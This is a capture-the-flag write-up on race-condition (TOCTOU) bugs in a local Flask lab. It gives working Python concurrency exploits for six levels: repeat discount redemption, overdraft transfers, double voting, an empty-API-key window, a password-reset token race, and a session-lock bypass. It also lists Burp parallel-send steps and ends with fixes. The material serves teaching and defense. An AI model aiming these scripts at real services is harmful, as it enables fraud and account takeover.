# 🏁 Race Condition CTF Lab — Writeup

> **Target:** `[http://127.0.0.1:5000](http://127.0.0.1:5000)`
> 
> 
> **Core Vulnerability:** Time-of-Check to Time-of-Use (TOCTOU) / Missing Synchronization Locks
> 
> 
> **Tools:** Python (`requests`, `threading`), Burp Suite Repeater
> 
> 

---

## 📊 Levels Overview

| Level | Challenge Name | Vulnerability Type | Key Technique |
| --- | --- | --- | --- |
| **01** | One-Time Discount Code | Limit Overrun | Concurrent `POST` requests without lock

 |
| **02** | Bank Transfer Overdraft | Limit Overrun | Parallel balance check bypass

 |
| **03** | Vote Twice | Classic TOCTOU | Concurrent state mutation

 |
| **04** | Empty API Key | Partial Construction | Staggered `GET` during user creation window

 |
| **05** | Token Collision | Single-Endpoint Session Race | Shared `requests.Session()` cookie race

 |
| **06** | Session-Based Lock | Lock Scope Bypass | Separate sessions (no shared cookie)

 |

---

## 🛠️ Methodology & Core Patterns

### 1. Burp Suite (Repeater Parallel Send)

1. Send the target request to **Repeater** and duplicate it 6–8 times (`Ctrl + R`).
2. Right-click a tab $\rightarrow$ **Add tab to group** $\rightarrow$ **Create tab group**.
3. Click the dropdown arrow next to **Send**:
* Select **Send group in parallel (single-packet attack)** for `HTTP/2`.
* Select **Send group in parallel (last-byte sync)** for `HTTP/1.1` (Flask local server).


4. Click **Send group (parallel)**.

### 2. Python (`threading.Barrier`)

Use `threading.Barrier(N)` to pause all threads at a starting gate and release them at the exact same microsecond.

---

## 💻 Level-by-Level Exploits & Python Solutions

### Level 1 — Limit Overrun (Discount Code)

* **Endpoint:** `POST /level1/redeem`


* **Root Cause:** Checks `if not state_lock_free.get("l1_used")` before setting `l1_used = True` after a 1-second delay.



```python
import requests
import threading

URL = "http://127.0.0.1:5000/level1/redeem"
gate = threading.Barrier(8)

def exploit():
    gate.wait()
    r = requests.post(URL)
    print(r.json())

threads = [threading.Thread(target=exploit) for _ in range(8)]
for t in threads: t.start()
for t in threads: t.join()

```

---

### Level 2 — Bank Transfer Overdraft

* **Endpoint:** `POST /level2/transfer` (`amount=500`)


* **Root Cause:** Checks `balance >= amount` before deducting from `balance`. Multiple `$500` requests pass the check simultaneously against a `$500` balance.



```python
import requests
import threading

URL = "http://127.0.0.1:5000/level2/transfer"
gate = threading.Barrier(8)

def exploit():
    gate.wait()
    r = requests.post(URL, data={"amount": "500"})
    print(r.json())

threads = [threading.Thread(target=exploit) for _ in range(8)]
for t in threads: t.start()
for t in threads: t.join()

```

---

### Level 3 — Vote Twice (TOCTOU)

* **Endpoint:** `POST /level3/vote`


* **Root Cause:** Checks `if not l3_voted` before incrementing `l3_votes` and setting the voted flag.



```python
import requests
import threading

URL = "http://127.0.0.1:5000/level3/vote"
gate = threading.Barrier(8)

def exploit():
    gate.wait()
    r = requests.post(URL)
    print(r.json())

threads = [threading.Thread(target=exploit) for _ in range(8)]
for t in threads: t.start()
for t in threads: t.join()

```

---

### Level 4 — Partial Construction (Empty API Key)

* **Endpoints:** `POST /level4/register` & `GET /level4/api`


* **Root Cause:** User record is created in memory with `api_key = None` before generating the real token. Passing `api-key[]=` (PHP-style empty array parameter) matches `None` during that window.



```python
import requests
import threading
import time

BASE = "http://127.0.0.1:5000"

def register():
    r = requests.post(f"{BASE}/level4/register", data={"username": "bob"})
    print("Register:", r.json())

def exploit(delay):
    time.sleep(delay)
    r = requests.get(f"{BASE}/level4/api?user=bob&api-key[]=")
    print(f"Exploit ({delay}s):", r.json())

t_reg = threading.Thread(target=register)
t_reg.start()

workers = [threading.Thread(target=exploit, args=(d,)) for d in [0.1, 0.2, 0.3, 0.4]]
for w in workers: w.start()

t_reg.join()
for w in workers: w.join()

```

---

### Level 5 — Single-Endpoint Token Collision

* **Endpoints:** `GET /level5/init`, `POST /level5/request_reset`, `GET /level5/inbox`, `POST /level5/confirm`


* **Root Cause:** Server-side session (`l5sid` cookie) stores `reset_user` and `reset_token` across separate jittered writes. Concurrent requests sharing one session can overwrite `reset_user` with `victim` while storing `attacker`'s token.



```python
import requests
import threading

BASE = "http://127.0.0.1:5000"

for attempt in range(1, 25):
    requests.post(f"{BASE}/level5/reset")
    s = requests.Session()
    s.get(f"{BASE}/level5/init")

    gate = threading.Barrier(2)

    def send_reset(username):
        gate.wait()
        s.post(f"{BASE}/level5/request_reset", data={"username": username})

    t1 = threading.Thread(target=send_reset, args=("victim",))
    t2 = threading.Thread(target=send_reset, args=("attacker",))
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    token = s.get(f"{BASE}/level5/inbox", params={"user": "attacker"}).json().get("token")
    if not token:
        continue

    confirm = s.post(f"{BASE}/level5/confirm", data={
        "token": token,
        "new_password": "hacked"
    }).json()

    if confirm.get("changed_user") == "victim":
        print(f"[+] Solved on attempt {attempt}: {confirm.get('flag')}")
        break

```

---

### Level 6 — Bypass a Session-Based Lock

* **Endpoint:** `POST /level6/redeem`


* **Root Cause:** Uses a `threading.Lock()` keyed per session ID (`sid`). Sharing a cookie serializes requests, whereas sending independent requests without a shared cookie assigns each request its own lock against the shared counter.



```python
import requests
import threading

URL = "http://127.0.0.1:5000/level6/redeem"
gate = threading.Barrier(6)

def exploit():
    gate.wait()
    # Calling requests.post() directly creates a fresh session/cookie per thread
    r = requests.post(URL)
    print(r.json())

threads = [threading.Thread(target=exploit) for _ in range(6)]
for t in threads: t.start()
for t in threads: t.join()

```

---

## 🛡️ Remediation Checklist

* **Levels 1–3:** Wrap the check-then-act logic inside a single `threading.Lock()` or an atomic database transaction (`UPDATE ... WHERE balance >= amount`).


* **Level 4:** Generate and assign the `api_key` atomically during the initial user creation write.


* **Level 5:** Associate password reset tokens directly with the user record in the database rather than mutable session state.


* **Level 6:** Tie the mutex lock to the **shared resource** (e.g., gift card ID) rather than the user's session ID.
